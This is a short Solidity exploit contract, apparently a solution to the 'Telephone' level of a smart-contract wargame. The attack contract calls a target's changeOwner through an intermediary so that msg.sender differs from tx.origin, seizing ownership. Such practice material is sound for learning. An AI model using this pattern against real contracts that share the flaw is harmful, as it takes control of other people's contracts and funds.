pragma solidity ^0.8.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address private target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        TelephoneInterface(target).changeOwner(msg.sender);
    }
}
